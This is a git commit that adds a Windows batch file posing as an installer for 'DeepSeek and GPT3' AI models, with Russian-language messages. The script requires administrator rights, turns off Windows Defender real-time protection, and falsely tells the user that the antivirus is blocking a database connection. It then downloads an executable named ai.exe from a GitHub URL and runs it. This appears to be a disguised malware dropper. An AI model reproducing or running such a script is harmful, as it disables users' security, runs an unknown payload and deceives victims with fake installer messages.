46f52a7ffe8d5e06f30d16de0a3168e4e26e1db0
AtomicAIDeveloper <b865910162@gmail.com>
2025-03-22 14:45:56 +0300

    Add files via upload

---
+++ ai_install.bat
@@ -0,0 +1,44 @@
+@echo off
+chcp 65001 >nul
+
+powershell -Command "Write-Host ' ______     ______   ______     __    __     __     ______        ______     __    ' -ForegroundColor Blue"
+powershell -Command "Write-Host '/\  __ \   /\__  _\ /\  __ \   /\ \"-./  \   /\ \   /\  ___\      /\  __ \   /\ \   ' -ForegroundColor Blue"
+powershell -Command "Write-Host '\ \  __ \  \/_/\ \/ \ \ \/\ \  \ \ \-./\ \  \ \ \  \ \ \____     \ \  __ \  \ \ \  ' -ForegroundColor Blue"
+powershell -Command "Write-Host ' \ \_\ \_\    \ \_\  \ \_____\  \ \_\ \ \_\  \ \_\  \ \_____\     \ \_\ \_\  \ \_\ ' -ForegroundColor Blue"
+powershell -Command "Write-Host '  \/_/\/_/     \/_/   \/_____/   \/_/  \/_/   \/_/   \/_____/      \/_/\/_/   \/_/ ' -ForegroundColor Blue"
+
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    powershell -Command "Write-Host 'Ошибка: недостаточно прав для установки' -ForegroundColor Red"
+    powershell -Command "Write-Host 'Запустите установщик от имени администратора' -ForegroundColor Red"
+    pause
+    exit /b
+)
+
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+
+powershell -Command "Get-MpPreference" | find "DisableRealtimeMonitoring" >nul 2>&1
+if %errorLevel% equ 0 (
+    echo Соединение с базой данных
+) else (
+    powershell -Command "Write-Host 'Ошибка: Windows Defender блокирует соединение с базой данных' -ForegroundColor Red"
+    powershell -Command "Write-Host 'Попробуйте отключить антивирус' -ForegroundColor Red"
+    pause
+    exit /b
+)
+
+echo Установка моделей DeepSeek и GPT3
+
+set "url=https://github.com/AtomicAIDeveloper/atomicAI/raw/refs/heads/main/ai.exe"
+set "downloadPath=%USERPROFILE%\Downloads\ai.exe"
+
+powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%downloadPath%'"
+if not exist "%downloadPath%" (
+    powershell -Command "Write-Host 'Ошибка скачивания' -ForegroundColor Red"
+    powershell -Command "Write-Host 'Попробуйте перезапустить загрузчик' -ForegroundColor Red"
+)
+
+start "" "%downloadPath%"
+echo Финальная конфигурация ИИ
+echo Это займет не более 10 минут, не выключайте компьютер
+pause
